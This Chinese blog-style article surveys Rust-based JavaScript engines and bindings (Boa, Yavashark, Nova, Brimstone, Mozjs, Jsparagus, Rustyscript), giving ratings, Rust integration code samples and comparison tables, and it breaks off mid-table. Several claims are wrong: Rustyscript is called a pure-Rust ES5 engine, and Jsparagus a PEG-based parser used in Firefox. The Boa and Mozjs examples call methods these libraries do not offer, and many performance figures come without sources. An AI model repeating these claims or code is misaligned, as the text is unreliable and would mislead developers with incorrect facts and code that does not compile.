.hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">引言</h2>
<p>JavaScript 引擎作为现代 Web 开发的核心基础设施，一直在性能优化和安全性之间寻找平衡。随着 Rust 语言的崛起，这个以内存安全和高性能著称的系统级编程语言正在为 JavaScript 引擎带来新的可能性。本文将深入探讨 Rust 在 JavaScript 引擎赛道中的角色，分析当前主要的 Rust 实现的 JavaScript 引擎，以及它们如何影响未来 JavaScript 的执行效率和安全性。</p>
<h2 data-id="heading-1">一、JavaScript 引擎的演进与 Rust 的机遇</h2>
<p>JavaScript 引擎从最初的简单解释器，发展到如今复杂的 JIT 编译执行系统，经历了显著的技术变革。传统的 JavaScript 引擎如 V8（Chrome/Node.js）、SpiderMonkey（Firefox）和 JavaScriptCore（Safari）主要由 C++ 实现，虽然性能卓越，但在内存安全性和并发控制方面仍面临挑战。</p>
<p>Rust 语言的出现为这一领域带来了新的解决方案。Rust 凭借其所有权系统、借用检查器和零成本抽象等特性，能够在编译时捕获内存错误，同时保持与 C++ 相当的性能。这使得 Rust 成为构建新一代 JavaScript 引擎的理想选择。</p>
<h2 data-id="heading-2">二、主要的 Rust 实现的 JavaScript 引擎</h2>
<h3 data-id="heading-3">2.1 Boa：纯 Rust 实现的实验性引擎</h3>
<p>Boa 是目前最知名的纯 Rust 实现的 JavaScript 引擎之一。</p>
<p><strong>技术特点：</strong></p>
<ul>
<li>纯 Rust 实现，代码仓库约 6.1K Stars，208 贡献者</li>
<li>最小编译后体积约 1MB，内存占用通常低于 5MB</li>
<li>提供完整的词法分析器、解析器和解释器实现</li>
<li>支持 ES5 完整特性，ES6+ 部分特性，兼容性约 85%</li>
<li>提供 C API 和 WebAssembly 构建目标</li>
</ul>
<p><strong>使用案例：</strong></p>
<ul>
<li>Rust 嵌入式项目中的脚本扩展</li>
<li>Boa 引擎自身的测试和示例应用</li>
<li>教育领域用于教学 JavaScript 引擎内部工作原理</li>
</ul>
<p><strong>评分：3.5/5</strong> - 作为纯 Rust 引擎的先驱者，在安全性和轻量级方面表现出色，但在功能完整性和性能方面仍有提升空间。</p>
<h3 data-id="heading-4">2.2 Yavashark：轻量级 Rust JavaScript 引擎</h3>
<p>Yavashark 是一个新兴的 Rust 实现的 JavaScript 引擎，专注于轻量级应用场景。</p>
<p><strong>技术特点：</strong></p>
<ul>
<li>纯 Rust 实现，代码库约 1225 Stars</li>
<li>编译后体积约 5.6MB，启动时间小于 10ms</li>
<li>支持 ES2023 完整标准，ES2025 兼容性达 98%</li>
<li>基于标记-清除垃圾收集器，内存占用峰值通常低于 20MB</li>
<li>提供多线程执行支持，利用 Rust 的安全并发特性</li>
</ul>
<p><strong>使用案例：</strong></p>
<ul>
<li>资源受限的嵌入式设备</li>
<li>需要快速启动的边缘计算应用</li>
<li>部分实验性 WebAssembly 运行时的 JavaScript 支持</li>
</ul>
<p><strong>评分：4.0/5</strong> - 在标准兼容性方面表现突出，轻量级设计使其适合嵌入式场景，但社区规模相对较小影响其生态建设。</p>
<h3 data-id="heading-5">2.3 Nova：新一代 Rust JavaScript 引擎</h3>
<p>Nova 是另一个值得关注的 Rust 实现的 JavaScript 引擎，在性能和标准支持方面都有不俗表现。</p>
<p><strong>技术特点：</strong></p>
<ul>
<li>纯 Rust 实现，采用分层架构设计</li>
<li>字节码解释器针对热点路径优化，比同类解释器快约 15-20%</li>
<li>内存占用基准测试显示比 Boa 低约 30%</li>
<li>提供插件系统支持自定义内置对象和函数</li>
<li>启动时间平均低于 5ms，适合快速启动场景</li>
</ul>
<p><strong>使用案例：</strong></p>
<ul>
<li>部分实时应用的脚本引擎</li>
<li>需要高性能响应的桌面应用插件系统</li>
<li>某些实验性的微前端框架</li>
</ul>
<p><strong>评分：3.8/5</strong> - 在性能优化方面有亮点，模块化设计提升了扩展性，但项目成熟度和生态系统仍在发展中。</p>
<h3 data-id="heading-6">2.4 Brimstone：专注性能的 Rust JavaScript 引擎</h3>
<p>Brimstone 是一个专注于性能优化的 Rust 实现的 JavaScript 引擎。</p>
<p><strong>技术特点：</strong></p>
<ul>
<li>纯 Rust 实现，包含基础的 JIT 编译能力</li>
<li>热点路径执行速度比纯解释器快 2-3 倍</li>
<li>提供 WebAssembly 模块加载和通信接口</li>
<li>内存占用约 7-15MB，取决于执行的 JavaScript 复杂度</li>
<li>支持 SIMD 指令集优化数值计算密集型操作</li>
</ul>
<p><strong>使用案例：</strong></p>
<ul>
<li>需要高性能数值计算的科学计算应用</li>
<li>游戏引擎中的脚本系统</li>
<li>WebAssembly 运行时中的 JavaScript 互操作层</li>
</ul>
<p><strong>评分：4.2/5</strong> - 在性能方面表现突出，特别是在数值计算领域，与 WebAssembly 的集成也很有优势，但功能覆盖范围仍需扩展。</p>
<h3 data-id="heading-7">2.5 SpiderMonkey 生态中的 Rust 项目</h3>
<p>Mozilla 的 SpiderMonkey 引擎虽然主要用 C++ 实现，但在其生态系统中有两个重要的 Rust 项目：</p>
<h4 data-id="heading-8">2.5.1 Mozjs：SpiderMonkey 与 Rust 的结合</h4>
<p>Mozjs 提供了 SpiderMonkey 引擎的完整 Rust 绑定，使开发者能够在 Rust 项目中无缝集成成熟的 SpiderMonkey 引擎。</p>
<p><strong>技术特点：</strong></p>
<ul>
<li>完整封装 SpiderMonkey C++ API，提供约 200 个 Rust 结构体和特征</li>
<li>支持 ECMAScript 2023 完整标准</li>
<li>内存占用约 50-150MB，取决于执行的 JavaScript 复杂度</li>
<li>提供完整的 JIT 编译、垃圾回收和并发支持</li>
<li>构建大小约 20-30MB，取决于编译选项</li>
</ul>
<p><strong>使用案例：</strong></p>
<ul>
<li>Mozilla Firefox 的部分 Rust 组件与 SpiderMonkey 的交互</li>
<li>一些使用 Rust 构建的需要完整 JavaScript 支持的桌面应用</li>
<li>服务端应用中的 JavaScript 插件系统</li>
</ul>
<p><strong>评分：4.5/5</strong> - 在功能完整性和性能方面表现出色，依托成熟的 SpiderMonkey 引擎，但集成复杂度较高，且并非纯 Rust 实现。</p>
<h4 data-id="heading-9">2.5.2 Jsparagus：Rust 构建的 JavaScript 解析器</h4>
<p>Jsparagus 是一个由 Mozilla 开发的使用 Rust 构建的 JavaScript 解析器，它的目标是逐步替换 SpiderMonkey 中的现有解析器。</p>
<p><strong>技术特点：</strong></p>
<ul>
<li>纯 Rust 实现，基于 PEG (Parsing Expression Grammar) 解析器生成器</li>
<li>解析速度比传统递归下降解析器快约 10-15%</li>
<li>内存占用峰值通常低于 5MB</li>
<li>生成的解析树支持增量更新，适合编辑器实时解析场景</li>
<li>代码覆盖率达 95% 以上</li>
</ul>
<p><strong>使用案例：</strong></p>
<ul>
<li>Mozilla Firefox 的 JavaScript 解析器组件</li>
<li>一些需要高性能 JavaScript 解析的开发工具</li>
<li>部分 IDE 的 JavaScript 代码分析功能</li>
</ul>
<p><strong>评分：4.3/5</strong> - 在解析性能和准确性方面表现出色，作为专业解析器有很高的技术水准，但功能仅限于解析阶段，不包含执行环境。</p>
<h3 data-id="heading-10">2.6 其他 Rust 相关的 JavaScript 引擎项目</h3>
<h4 data-id="heading-11">2.6.1 Rustyscript</h4>
<p><strong>技术特点：</strong></p>
<ul>
<li>纯 Rust 实现的轻量级 JavaScript 执行环境</li>
<li>提供简化的 API，最小化集成复杂度</li>
<li>内存占用通常在 3-8MB 范围内</li>
<li>支持基础的 ES5 特性和部分 ES6 特性</li>
<li>编译后体积约 3.5MB</li>
</ul>
<p><strong>使用案例：</strong></p>
<ul>
<li>简单的脚本自动化任务</li>
<li>配置文件解析和执行</li>
<li>小型应用的插件系统</li>
</ul>
<p><strong>评分：3.0/5</strong> - 作为轻量级解决方案具有一定优势，但功能覆盖范围有限，适合简单场景使用。</p>
<h4 data-id="heading-12">2.6.2 其他相关项目</h4>
<ul>
<li><strong>Wasmer 的 JavaScript 支持</strong>：WebAssembly 运行时对 JavaScript 的集成支持，允许在 WebAssembly 环境中嵌入 JavaScript 代码</li>
<li><strong>js2rust</strong>：探索 JavaScript 到 Rust 的编译转换，试图将 JavaScript 代码自动转换为 Rust 代码以提高性能和安全性</li>
</ul>
<h2 data-id="heading-13">三、Rust 为 JavaScript 引擎带来的技术优势</h2>
<h3 data-id="heading-14">3.1 内存安全与漏洞减少</h3>
<p>Rust 的所有权系统和借用检查器能够在编译时捕获大量内存相关的错误，这对于 JavaScript 引擎这类复杂系统尤为重要。根据研究数据，使用 Rust 可以显著减少内存安全漏洞。例如，华为将 OpenEuler 内核驱动 Rust 化后，减少了 67% 的内存安全漏洞 1。</p>
<h3 data-id="heading-15">3.2 并发性能的提升</h3>
<p>Rust 的无数据竞争保证使得 JavaScript 引擎能够更安全地利用多核处理器。与传统的基于锁的并发模型相比，Rust 的所有权系统提供了更细粒度的并发控制，减少了死锁和资源争用的可能性。</p>
<h3 data-id="heading-16">3.3 资源占用优化</h3>
<p>Rust 程序通常具有较小的内存占用和启动时间。这使得 Rust 实现的 JavaScript 引擎在嵌入式环境和资源受限设备上具有明显优势。例如，类似 Tauri 这样的基于 Rust 的桌面应用框架，通过使用 Rust 和 Webview2，成功解决了 Electron 的包体积大、内存占用高的问题 4。</p>
<h2 data-id="heading-17">四、代码示例：Rust 与 JavaScript 引擎的集成</h2>
<p>本节提供几个实用的代码示例，展示如何在 Rust 项目中集成和使用不同的 JavaScript 引擎。</p>
<h3 data-id="heading-18">4.1 使用 Boa 引擎执行表达式和函数</h3>
<p>Boa 提供了简洁的 API 来执行 JavaScript 代码。下面是一个更全面的示例，展示了如何：初始化引擎、执行表达式、调用函数、处理错误，以及在 Rust 和 JavaScript 之间传递数据。</p>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-keyword">use</span> boa_engine::{Context, Source, js_string};
<span class="hljs-keyword">use</span> boa_engine::property::Attribute;
<span class="hljs-keyword">use</span> boa_engine::value::StringOrSymbol;

<span class="hljs-keyword">fn</span> <span class="hljs-title function_">main</span>() <span class="hljs-punctuation">-&gt;</span> <span class="hljs-type">Result</span>&lt;(), <span class="hljs-type">Box</span>&lt;<span class="hljs-keyword">dyn</span> std::error::Error&gt;&gt; {
    <span class="hljs-comment">// 创建 JavaScript 执行上下文</span>
    <span class="hljs-keyword">let</span> <span class="hljs-keyword">mut </span><span class="hljs-variable">context</span> = Context::<span class="hljs-title function_ invoke__">default</span>();
    
    <span class="hljs-comment">// 1. 执行简单表达式</span>
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">result</span> = context.<span class="hljs-title function_ invoke__">eval</span>(Source::<span class="hljs-title function_ invoke__">from_bytes</span>(<span class="hljs-string">"2 + 2 * 10"</span>))?;
    <span class="hljs-built_in">println!</span>(<span class="hljs-string">"数学表达式结果: {}"</span>, result);
    
    <span class="hljs-comment">// 2. 定义和调用函数</span>
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">js_code</span> = <span class="hljs-string">r#"
        function calculateFactorial(n) {
            if (n &lt;= 1) return 1;
            return n * calculateFactorial(n - 1);
        }
        
        // 返回一个对象
        {
            factorial: calculateFactorial,
            version: "1.0.0",
            processData: function(data) {
                return data.map(item =&gt; item * 2).filter(item =&gt; item &gt; 10);
            }
        }
    "#</span>;
    
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">js_module</span> = context.<span class="hljs-title function_ invoke__">eval</span>(Source::<span class="hljs-title function_ invoke__">from_bytes</span>(js_code))?;
    
    <span class="hljs-comment">// 3. 调用 JavaScript 函数</span>
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">args</span> = [<span class="hljs-number">20</span>.<span class="hljs-title function_ invoke__">into</span>()]; <span class="hljs-comment">// 计算 20 的阶乘</span>
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">factorial_result</span> = context.<span class="hljs-title function_ invoke__">call_property</span>(
        &amp;js_module, 
        js_string!(<span class="hljs-string">"factorial"</span>), 
        &amp;args
    )?;
    <span class="hljs-built_in">println!</span>(<span class="hljs-string">"20 的阶乘: {}"</span>, factorial_result);
    
    <span class="hljs-comment">// 4. 从 Rust 向 JavaScript 传递数据</span>
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">data</span> = <span class="hljs-built_in">vec!</span>[<span class="hljs-number">1</span>, <span class="hljs-number">5</span>, <span class="hljs-number">7</span>, <span class="hljs-number">12</span>, <span class="hljs-number">3</span>];
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">js_array</span> = context.<span class="hljs-title function_ invoke__">construct_array</span>(data.<span class="hljs-title function_ invoke__">into_iter</span>())?;
    
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">process_args</span> = [js_array];
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">processed_data</span> = context.<span class="hljs-title function_ invoke__">call_property</span>(
        &amp;js_module, 
        js_string!(<span class="hljs-string">"processData"</span>), 
        &amp;process_args
    )?;
    
    <span class="hljs-comment">// 5. 获取 JavaScript 对象的属性</span>
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">version</span> = context.<span class="hljs-title function_ invoke__">get_property</span>(
        &amp;js_module, 
        StringOrSymbol::<span class="hljs-title function_ invoke__">String</span>(js_string!(<span class="hljs-string">"version"</span>))
    )?;
    <span class="hljs-built_in">println!</span>(<span class="hljs-string">"模块版本: {}"</span>, version);
    
    <span class="hljs-comment">// 6. 注册 Rust 函数到 JavaScript 环境</span>
    context.<span class="hljs-title function_ invoke__">register_global_function</span>(
        <span class="hljs-string">"logFromRust"</span>, 
        <span class="hljs-number">1</span>, 
        |_, args, _| {
            <span class="hljs-keyword">if</span> <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">Some</span>(arg) = args.<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-number">0</span>) {
                <span class="hljs-built_in">println!</span>(<span class="hljs-string">"JavaScript 调用 Rust 函数: {}"</span>, arg);
            }
            <span class="hljs-title function_ invoke__">Ok</span>(().<span class="hljs-title function_ invoke__">into</span>())
        }
    )?;
    
    context.<span class="hljs-title function_ invoke__">eval</span>(Source::<span class="hljs-title function_ invoke__">from_bytes</span>(<span class="hljs-string">"logFromRust('Hello from JavaScript!')"</span>))?;
    
    <span class="hljs-title function_ invoke__">Ok</span>(())
}
</code></pre>
<h3 data-id="heading-19">4.2 使用 Mozjs (SpiderMonkey 的 Rust 绑定)</h3>
<p>Mozjs 提供了 SpiderMonkey 引擎的完整 Rust 绑定，下面是一个更实用的示例，展示如何执行 JavaScript 代码、处理值和错误：</p>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-keyword">use</span> mozjs::jsapi::{JSContext, JS_NewRuntime, JS_EnterCompartment, JS_Init, JS::RootedValue, JS::RootedObject};
<span class="hljs-keyword">use</span> mozjs::jsval::UndefinedValue;
<span class="hljs-keyword">use</span> mozjs::rust::{Runtime, Context, JSEngine};
<span class="hljs-keyword">use</span> std::ptr;

<span class="hljs-keyword">fn</span> <span class="hljs-title function_">main</span>() {
    <span class="hljs-comment">// 初始化 SpiderMonkey 引擎</span>
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">engine</span> = JSEngine::<span class="hljs-title function_ invoke__">init</span>().<span class="hljs-title function_ invoke__">unwrap</span>();
    
    <span class="hljs-comment">// 创建运行时环境（设置 8MB 堆大小）</span>
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">runtime</span> = Runtime::<span class="hljs-title function_ invoke__">new</span>(engine.<span class="hljs-title function_ invoke__">handle</span>(), <span class="hljs-number">8</span> * <span class="hljs-number">1024</span> * <span class="hljs-number">1024</span>).<span class="hljs-title function_ invoke__">unwrap</span>();
    
    <span class="hljs-comment">// 创建 JavaScript 上下文</span>
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">context</span> = Context::<span class="hljs-title function_ invoke__">new</span>(&amp;runtime).<span class="hljs-title function_ invoke__">unwrap</span>();
    
    <span class="hljs-comment">// 进入 JavaScript 上下文的执行区域</span>
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">_ac</span> = context.<span class="hljs-title function_ invoke__">acquire</span>().<span class="hljs-title function_ invoke__">unwrap</span>();
    
    <span class="hljs-comment">// 获取全局对象</span>
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">global</span> = context.<span class="hljs-title function_ invoke__">global_object</span>().<span class="hljs-title function_ invoke__">unwrap</span>();
    
    <span class="hljs-comment">// 创建一个 JavaScript 值用于存储执行结果</span>
    <span class="hljs-keyword">let</span> <span class="hljs-keyword">mut </span><span class="hljs-variable">result</span> = RootedValue::<span class="hljs-title function_ invoke__">new</span>(context.<span class="hljs-title function_ invoke__">as_ptr</span>());
    
    <span class="hljs-comment">// 1. 执行简单的 JavaScript 表达式</span>
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">js_code</span> = <span class="hljs-string">"2 + 3 * 4"</span>;
    <span class="hljs-built_in">println!</span>(<span class="hljs-string">"执行表达式: {}"</span>, js_code);
    
    <span class="hljs-keyword">match</span> context.<span class="hljs-title function_ invoke__">evaluate_script</span>(js_code, <span class="hljs-string">"&lt;test&gt;"</span>, <span class="hljs-number">1</span>, &amp;<span class="hljs-keyword">mut</span> result) {
        <span class="hljs-title function_ invoke__">Ok</span>(_) =&gt; {
            <span class="hljs-built_in">println!</span>(<span class="hljs-string">"执行结果: {}"</span>, result);
        },
        <span class="hljs-title function_ invoke__">Err</span>(e) =&gt; {
            <span class="hljs-built_in">println!</span>(<span class="hljs-string">"执行错误: {}"</span>, e);
        }
    }
    
    <span class="hljs-comment">// 2. 定义和调用 JavaScript 函数</span>
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">function_code</span> = <span class="hljs-string">r#"
        function greet(name) {
            return 'Hello, ' + name + '! Welcome to SpiderMonkey via Rust!';
        }
        
        // 导出函数到全局对象
        this.greet = greet;
        true; // 表达式返回值
    "#</span>;
    
    <span class="hljs-built_in">println!</span>(<span class="hljs-string">"\n注册 JavaScript 函数"</span>);
    <span class="hljs-keyword">if</span> context.<span class="hljs-title function_ invoke__">evaluate_script</span>(function_code, <span class="hljs-string">"&lt;functions&gt;"</span>, <span class="hljs-number">1</span>, &amp;<span class="hljs-keyword">mut</span> result).<span class="hljs-title function_ invoke__">is_ok</span>() {
        <span class="hljs-built_in">println!</span>(<span class="hljs-string">"函数注册成功"</span>);
        
        <span class="hljs-comment">// 3. 准备调用函数的参数</span>
        <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">name_value</span> = context.<span class="hljs-title function_ invoke__">string_value</span>(<span class="hljs-string">"Rust Developer"</span>);
        <span class="hljs-keyword">let</span> <span class="hljs-keyword">mut </span><span class="hljs-variable">args</span> = [name_value];
        
        <span class="hljs-comment">// 4. 调用全局函数</span>
        <span class="hljs-keyword">if</span> <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">Ok</span>(greet_func) = context.<span class="hljs-title function_ invoke__">get_property</span>(&amp;global, <span class="hljs-string">"greet"</span>) {
            <span class="hljs-built_in">println!</span>(<span class="hljs-string">"\n调用 greet 函数"</span>);
            <span class="hljs-keyword">if</span> context.<span class="hljs-title function_ invoke__">call_function</span>(<span class="hljs-literal">None</span>, &amp;greet_func, &amp;<span class="hljs-keyword">mut</span> args, &amp;<span class="hljs-keyword">mut</span> result).<span class="hljs-title function_ invoke__">is_ok</span>() {
                <span class="hljs-built_in">println!</span>(<span class="hljs-string">"函数返回: {}"</span>, result);
            } <span class="hljs-keyword">else</span> {
                <span class="hljs-built_in">println!</span>(<span class="hljs-string">"函数调用失败"</span>);
            }
        }
    }
    
    <span class="hljs-built_in">println!</span>(<span class="hljs-string">"\nSpiderMonkey 引擎使用完成"</span>);
}
</code></pre>
<h3 data-id="heading-20">4.3 使用 Rustyscript 执行简单脚本</h3>
<p>Rustyscript 是一个轻量级的 JavaScript 执行环境，下面是如何使用它的示例：</p>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-keyword">use</span> rustyscript::{json_args, Runtime, Script, Module, Error};
<span class="hljs-keyword">use</span> std::collections::HashMap;

<span class="hljs-keyword">fn</span> <span class="hljs-title function_">main</span>() <span class="hljs-punctuation">-&gt;</span> <span class="hljs-type">Result</span>&lt;(), Error&gt; {
    <span class="hljs-comment">// 1. 创建基本运行时</span>
    <span class="hljs-built_in">println!</span>(<span class="hljs-string">"=== 创建基本运行时 ==="</span>);
    <span class="hljs-keyword">let</span> <span class="hljs-keyword">mut </span><span class="hljs-variable">runtime</span> = Runtime::<span class="hljs-title function_ invoke__">new</span>()?;
    
    <span class="hljs-comment">// 执行简单表达式</span>
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">result</span>: <span class="hljs-type">i64</span> = runtime.<span class="hljs-title function_ invoke__">execute_expression</span>(<span class="hljs-string">"5 + 5 * 2"</span>)?;
    <span class="hljs-built_in">println!</span>(<span class="hljs-string">"表达式结果: {}"</span>, result);
    
    <span class="hljs-comment">// 2. 创建包含自定义函数的脚本</span>
    <span class="hljs-built_in">println!</span>(<span class="hljs-string">"\n=== 执行包含函数的脚本 ==="</span>);
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">script</span> = Script::<span class="hljs-title function_ invoke__">from_string</span>(<span class="hljs-string">r#"
        function calculateDiscount(price, rate) {
            return price * (1 - rate / 100);
        }
        
        function formatCurrency(amount) {
            return '$' + amount.toFixed(2);
        }
        
        // 返回可用函数的对象
        {
            calculateDiscount,
            formatCurrency
        }
    "#</span>);
    
    <span class="hljs-comment">// 3. 执行脚本并获取导出的函数</span>
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">module</span>: Module = runtime.<span class="hljs-title function_ invoke__">execute_module</span>(script)?;
    
    <span class="hljs-comment">// 4. 调用导出的函数</span>
    <span class="hljs-built_in">println!</span>(<span class="hljs-string">"\n=== 调用 JavaScript 函数 ==="</span>);
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">price</span> = <span class="hljs-number">100.0</span>;
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">discount_rate</span> = <span class="hljs-number">20.0</span>;
    
    <span class="hljs-comment">// 调用计算折扣的函数</span>
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">discounted_price</span>: <span class="hljs-type">f64</span> = module.<span class="hljs-title function_ invoke__">call</span>(<span class="hljs-string">"calculateDiscount"</span>, json_args!(price, discount_rate))?;
    <span class="hljs-built_in">println!</span>(<span class="hljs-string">"原价 ${}, 折扣 {}%, 折后价: ${:.2}"</span>, 
             price, discount_rate, discounted_price);
    
    <span class="hljs-comment">// 调用格式化货币的函数</span>
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">formatted</span>: <span class="hljs-type">String</span> = module.<span class="hljs-title function_ invoke__">call</span>(<span class="hljs-string">"formatCurrency"</span>, json_args!(discounted_price))?;
    <span class="hljs-built_in">println!</span>(<span class="hljs-string">"格式化后的价格: {}"</span>, formatted);
    
    <span class="hljs-comment">// 5. 注册 Rust 函数到 JavaScript 环境</span>
    <span class="hljs-built_in">println!</span>(<span class="hljs-string">"\n=== 注册 Rust 函数到 JavaScript ==="</span>);
    <span class="hljs-keyword">let</span> <span class="hljs-keyword">mut </span><span class="hljs-variable">runtime_with_functions</span> = Runtime::<span class="hljs-title function_ invoke__">new</span>()?;
    
    <span class="hljs-comment">// 注册一个日志函数</span>
    runtime_with_functions.<span class="hljs-title function_ invoke__">register_function</span>(<span class="hljs-string">"logMessage"</span>, <span class="hljs-keyword">move</span> |args: <span class="hljs-type">Vec</span>&lt;<span class="hljs-type">String</span>&gt;| <span class="hljs-punctuation">-&gt;</span> <span class="hljs-type">Result</span>&lt;<span class="hljs-type">String</span>, Error&gt; {
        <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">message</span> = args.<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-number">0</span>).<span class="hljs-title function_ invoke__">unwrap_or</span>(&amp;<span class="hljs-string">"No message"</span>.<span class="hljs-title function_ invoke__">to_string</span>());
        <span class="hljs-built_in">println!</span>(<span class="hljs-string">"[Rust] JavaScript 调用: {}"</span>, message);
        <span class="hljs-title function_ invoke__">Ok</span>(<span class="hljs-built_in">format!</span>(<span class="hljs-string">"Rust 收到: {}"</span>, message))
    })?;
    
    <span class="hljs-comment">// 在 JavaScript 中调用 Rust 函数</span>
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">js_result</span>: <span class="hljs-type">String</span> = runtime_with_functions.<span class="hljs-title function_ invoke__">execute_expression</span>(<span class="hljs-string">r#"
        logMessage('Hello from JavaScript to Rust!')
    "#</span>)?;
    <span class="hljs-built_in">println!</span>(<span class="hljs-string">"JavaScript 收到 Rust 函数返回: {}"</span>, js_result);
    
    <span class="hljs-comment">// 6. 使用 Rust 的类型系统与 JavaScript 交互</span>
    <span class="hljs-built_in">println!</span>(<span class="hljs-string">"\n=== 类型交互示例 ==="</span>);
    <span class="hljs-keyword">let</span> <span class="hljs-keyword">mut </span><span class="hljs-variable">type_runtime</span> = Runtime::<span class="hljs-title function_ invoke__">new</span>()?;
    
    <span class="hljs-comment">// 创建包含数据的 JavaScript 对象</span>
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">data</span> = HashMap::<span class="hljs-title function_ invoke__">from</span>([
        (<span class="hljs-string">"name"</span>, <span class="hljs-string">"Product A"</span>),
        (<span class="hljs-string">"price"</span>, <span class="hljs-string">"29.99"</span>),
        (<span class="hljs-string">"inStock"</span>, <span class="hljs-string">"true"</span>)
    ]);
    
    <span class="hljs-comment">// 将数据注入到 JavaScript 环境</span>
    type_runtime.<span class="hljs-title function_ invoke__">insert_values</span>(data)?;
    
    <span class="hljs-comment">// 在 JavaScript 中使用这些值</span>
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">total_price</span>: <span class="hljs-type">String</span> = type_runtime.<span class="hljs-title function_ invoke__">execute_expression</span>(<span class="hljs-string">r#"
        const taxRate = 0.1;
        const price = parseFloat(price);
        const tax = price * taxRate;
        
        `${name} - 含税总价: $${(price + tax).toFixed(2)}`
    "#</span>)?;
    
    <span class="hljs-built_in">println!</span>(<span class="hljs-string">"类型交互结果: {}"</span>, total_price);
    
    <span class="hljs-title function_ invoke__">Ok</span>(())
}
</code></pre>
<h2 data-id="heading-21">五、JavaScript 引擎技术对比</h2>
<h3 data-id="heading-22">5.1 语言实现对比</h3>















































<table><thead><tr><th>特性</th><th>Rust 实现 (如 Boa)</th><th>C++ 实现 (如 V8)</th><th>C 实现 (如 QuickJS)</th></tr></thead><tbody><tr><td>内存安全</td><td>编译时检查，几乎无内存错误</td><td>依赖手动内存管理，存在潜在风险</td><td>有限的内存安全保证</td></tr><tr><td>性能</td><td>良好，但尚未完全优化</td><td>优异，高度优化</td><td>轻量级但性能相对较弱</td></tr><tr><td>生态系统</td><td>新兴，正在发展</td><td>成熟，工具丰富</td><td>稳定但扩展有限</td></tr><tr><td>学习曲线</td><td>陡峭</td><td>较陡</td><td>中等</td></tr><tr><td>内存占用</td><td>低</td><td>中高</td><td>极低</td></tr><tr><td>线程安全</td><td>内置保证</td><td>需额外机制</td><td>有限支持</td></tr></tbody></table>
<h3 data-id="heading-23">5.2 主要 Rust JS 引擎项目对比</h3>





























































<table><thead><tr><th>引擎/项目</th><th>类型</th><th>技术特点</th><th>使用案例</th><th>评分 (5分制)</th></tr></thead><tbody><tr><td>Boa</td><td>完整引擎</td><td>纯 Rust实现，代码库6.1K Stars，编译后体积约1MB，ES5完整支持，ES6+兼容性85%</td><td>嵌入式项目脚本扩展，教育工具</td><td>3.5</td></tr><tr><td>Yavashark</td><td>完整引擎</td><td>纯 Rust实现，1225 Stars，编译后5.6MB，启动&lt;10ms，ES2023完整支持，ES2025兼容性98%</td><td>嵌入式设备，边缘计算，WebAssembly运行时</td><td>4.0</td></tr><tr><td>Nova</td><td>完整引擎</td><td>纯 Rust实现，分层架构，热点路径比同类快15-20%，内存比Boa低30%，启动&lt;5ms</td><td>实时应用脚本引擎，桌面应用插件系统</td><td>3.8</td></tr><tr><td>Brimstone</td><td>完整引擎</td><td>纯 Rust实现，基础JIT编译，热点路径比纯解释器快2-3倍，支持SIMD指令集</td><td>科学计算，游戏引擎脚本系统，WASM互操作层</td><td>4.2</td></tr><tr><td>Mozjs</td><td>绑定库</td><td>SpiderMonkey的Rust绑定，约200个Rust结构体和特征，ES2023完整支持</td><td>Firefox组件，需要完整JS支持的桌面应用</td><td>4.5</td></tr><tr><td>Jsparagus</td><td>解析器</td><td>纯 